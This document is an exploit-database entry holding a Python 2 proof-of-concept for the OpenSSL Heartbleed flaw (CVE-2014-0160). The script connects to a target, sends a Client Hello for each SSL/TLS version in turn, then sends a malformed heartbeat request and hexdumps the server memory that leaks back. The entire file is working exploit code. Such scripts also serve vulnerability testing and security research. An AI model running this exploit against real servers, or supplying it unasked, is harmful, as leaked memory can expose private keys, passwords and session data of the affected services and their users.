# Date: [2014-04-09]
# Exploit Author: [Csaba Fitzl]
# Vendor Homepage: [http://www.openssl.org/]
# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]
# Version: [1.0.1f]
# Tested on: [N/A]
# CVE : [2014-0160]
 
 
#!/usr/bin/env python
 
# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
# Modified by Csaba Fitzl for multiple SSL / TLS version support
 
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
 
options = OptionParser(usage=&#039;%prog server [options]&#039;, description=&#039;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#039;)
options.add_option(&#039;-p&#039;, &#039;--port&#039;, type=&#039;int&#039;, default=443, help=&#039;TCP port to test (default: 443)&#039;)
 
def h2bin(x):
    return x.replace(&#039; &#039;, &#039;&#039;).replace(&#039;\n&#039;, &#039;&#039;).decode(&#039;hex&#039;)
 
version = []
version.append([&#039;SSL 3.0&#039;,&#039;03 00&#039;])
version.append([&#039;TLS 1.0&#039;,&#039;03 01&#039;])
version.append([&#039;TLS 1.1&#039;,&#039;03 02&#039;])
version.append([&#039;TLS 1.2&#039;,&#039;03 03&#039;])
 
def create_hello(version):
    hello = h2bin(&#039;16 &#039; + version + &#039; 00 dc 01 00 00 d8 &#039; + version + &#039;&#039;&#039; 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
&#039;&#039;&#039;)
    return hello
 
def create_hb(version):
    hb = h2bin(&#039;18 &#039; + version + &#039; 00 03 01 40 00&#039;)
    return hb
 
def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = &#039; &#039;.join(&#039;%02X&#039; % ord(c) for c in lin)
        pdat = &#039;&#039;.join((c if 32 <= ord(c) <= 126 else &#039;.&#039; )for c in lin)
        print &#039;  %04x: %-48s %s&#039; % (b, hxdat, pdat)
    print
 
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = &#039;&#039;
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
 
 
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print &#039;Unexpected EOF receiving record header - server closed connection&#039;
        return None, None, None
    typ, ver, ln = struct.unpack(&#039;>BHH&#039;, hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print &#039;Unexpected EOF receiving record payload - server closed connection&#039;
        return None, None, None
    print &#039; ... received message: type = %d, ver = %04x, length = %d&#039; % (typ, ver, len(pay))
    return typ, ver, pay
 
def hit_hb(s,hb):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print &#039;No heartbeat response received, server likely not vulnerable&#039;
            return False
 
        if typ == 24:
            print &#039;Received heartbeat response:&#039;
            hexdump(pay)
            if len(pay) > 3:
                print &#039;WARNING: server returned more data than it should - server is vulnerable!&#039;
            else:
                print &#039;Server processed malformed heartbeat, but did not return any extra data.&#039;
            return True
 
        if typ == 21:
            print &#039;Received alert:&#039;
            hexdump(pay)
            print &#039;Server returned error, likely not vulnerable&#039;
            return False
 
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    for i in range(len(version)):
        print &#039;Trying &#039; + version[i][0] + &#039;...&#039;
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print &#039;Connecting...&#039;
        sys.stdout.flush()
        s.connect((args[0], opts.port))
        print &#039;Sending Client Hello...&#039;
        sys.stdout.flush()
        s.send(create_hello(version[i][1]))
        print &#039;Waiting for Server Hello...&#039;
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print &#039;Server closed connection without sending Server Hello.&#039;
                return
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
 
        print &#039;Sending heartbeat request...&#039;
        sys.stdout.flush()
        s.send(create_hb(version[i][1]))
        if hit_hb(s,create_hb(version[i][1])):
            #Stop if vulnerable
            break
 
if __name__ == &#039;__main__&#039;:
    main()

